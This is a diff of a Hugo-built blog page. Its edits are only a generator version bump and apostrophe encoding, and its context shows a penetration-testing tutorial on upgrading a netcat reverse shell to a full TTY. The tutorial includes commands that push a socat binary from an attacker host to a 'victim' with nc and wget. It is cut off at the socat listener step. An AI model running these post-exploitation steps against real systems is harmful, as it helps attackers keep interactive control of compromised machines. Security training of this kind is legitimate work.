@@ -89,7 +89,7 @@
 <script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
 
 
-<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.62.2" />
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.64.0" />
         
 
         
@@ -178,9 +178,9 @@
     <div class="content-width text-justify"><p>Ended up with a cheap <code>nc</code> shell and want to upgrade to a &ldquo;real&rdquo; shell with a proper TTY and navigation?</p>
 <p>Say no more &lt;:</p>
 <h1 id="1-upgrading-using-shell-magic">1. Upgrading using shell magic</h1>
-<p>This doesn't always work - however if Python is present on the victims machine, it's worth a try.</p>
+<p>This doesn&rsquo;t always work - however if Python is present on the victims machine, it&rsquo;s worth a try.</p>
 <ol>
-<li>Use <code>bash</code> on the attacker machine, <code>zsh</code> doesn't seem to work.</li>
+<li>Use <code>bash</code> on the attacker machine, <code>zsh</code> doesn&rsquo;t seem to work.</li>
 <li>Get the <code>nc</code> shell.</li>
 <li>In the shell, execute:</li>
 </ol>
@@ -197,20 +197,20 @@
 <li>Execute <code>fg</code> to bring the <code>nc</code> shell back.</li>
 <li>Type <code>reset</code> and press enter.</li>
 </ol>
-<p>Now a proper shell should be present which doesn't close connections upon CTRL+C &lt;:</p>
-<p>If this didn't work, try the next method:</p>
+<p>Now a proper shell should be present which doesn&rsquo;t close connections upon CTRL+C &lt;:</p>
+<p>If this didn&rsquo;t work, try the next method:</p>
 <h1 id="2-upgrading-using-socat">2. Upgrading using socat</h1>
 <p>The tool <code>socat</code> can be used to create proper shell sessions. For this, a static binary of the tool is required which can be downloaded <a href="https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64">here</a>.</p>
 <p>First, transfer the <code>socat</code> binary to the victims machine using <code>nc</code> or <code>wget</code>:</p>
 <p><strong>The <code>nc</code> method:</strong></p>
 <p>a) Use <code>nc -vvlp 1337 &lt; socat</code> to start a server which pushes the binary to the connecting machine.</p>
-<p>b) On the victim, execute <code>nc</code> which downloads the file using <code>nc &lt;IP&gt; &lt;PORT&gt; &gt; /tmp/socat</code>. You may manually stop the download process because it won't terminate on its own.</p>
+<p>b) On the victim, execute <code>nc</code> which downloads the file using <code>nc &lt;IP&gt; &lt;PORT&gt; &gt; /tmp/socat</code>. You may manually stop the download process because it won&rsquo;t terminate on its own.</p>
 <p><strong>The <code>wget</code> method:</strong></p>
 <p>a) Attacker: <code>cd</code> into the folder containing the binary and execute <code>python -m SimpleHTTPServer &lt;PORT&gt;</code>.</p>
 <p>b) Use</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd /tmp <span style="color:#f92672">&amp;&amp;</span> wget http://&lt;IP&gt;:&lt;PORT&gt;/socat
 </code></pre></div><p>to download the file from the attackers machine.</p>
-<p>After that, it's time to spawn the shell:</p>
+<p>After that, it&rsquo;s time to spawn the shell:</p>
 <ol>
 <li>Create a <code>socat</code> listener on the attacking machine with</li>
 </ol>
